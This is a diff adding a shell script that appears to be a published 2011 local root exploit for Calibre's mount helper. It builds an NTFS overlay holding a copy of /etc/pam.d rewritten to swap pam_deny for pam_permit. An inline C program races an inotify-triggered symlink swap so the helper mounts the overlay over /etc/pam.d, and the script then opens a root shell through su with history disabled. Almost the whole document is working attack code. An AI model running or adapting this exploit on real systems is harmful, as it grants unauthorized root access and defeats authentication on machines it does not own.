@@ -1,0 +1,85 @@
+#!/bin/sh
+
+             ###########################################
+             #         .70-Calibrer Assault Mount      #
+             #  by Dan Rosenberg (@djrbliss) and zx2c4 #
+             ###########################################
+
+################################################################################
+# Yesterday we learned how Calibre's ability to mount anything anywhere resulted
+# in a local root. Today's exploit shows a race condition to subvert recent
+# changes preventing symlinks and checking path prefixes.
+#
+# - djrbliss & zx2c4
+# 2011-11-3
+################################################################################
+
+
+overlay=/dev/shm/overlay
+staging=/media/staging
+mounter=calibre-mount-helper
+fakemount=/media/staging/fake
+target=/etc/pam.d
+mkfsntfs=/sbin/mkfs.ntfs
+
+echo "[+] Making overlay image:"
+dd if=/dev/zero of=$overlay count=51200
+$mkfsntfs -F $overlay
+
+echo "[+] Mounting overlay image using calibre-mount-helper."
+$mounter mount $overlay $staging
+
+echo "[+] Copying /etc/pam.d/ into overlay."
+cp /etc/pam.d/* $staging/ 2>/dev/null
+
+sed -i "s/pam_deny.so/pam_permit.so/g" $staging/common-auth
+
+echo "[*] Making fake mountpoint."
+rm -rf $fakemount 2>/dev/null
+
+echo "[*] Preparing binary payload..."
+
+cat > /tmp/pwn.c << _EOF
+#include <stdio.h>
+#include <sys/inotify.h>
+#include <unistd.h>
+
+int main(int argc, char **argv)
+{
+
+	int fd, wd, ret;
+
+        if (fork()) {
+                fd = inotify_init();
+
+                unlink("$fakemount");
+                mkdir("$fakemount");
+                
+                wd = inotify_add_watch(fd, "$fakemount", IN_CREATE);
+                read(fd, 0, 0);
+                
+                rename("$fakemount", "$staging/tmp");
+                symlink("$target", "$fakemount");
+                rmdir("$staging/tmp");
+
+                return 0;
+
+	} else {
+		sleep(1);
+		return system("$mounter mount $overlay $fakemount");
+	}
+	return 0;
+}
+_EOF
+
+gcc /tmp/pwn.c -o /tmp/pwn
+ret=1
+while [ $ret -ne 0 ]; do
+	/tmp/pwn
+	ret=$?
+done;
+
+sleep 2
+
+echo "[+] Asking for root. When prompted for a password, type anything and press enter."
+su -c "echo \"[+] Cleaning up.\"; umount $fakemount; umount $staging; rm -rf $overlay; echo \"[+] Getting shell.\"; HISTFILE=\"/dev/null\" exec /bin/sh"
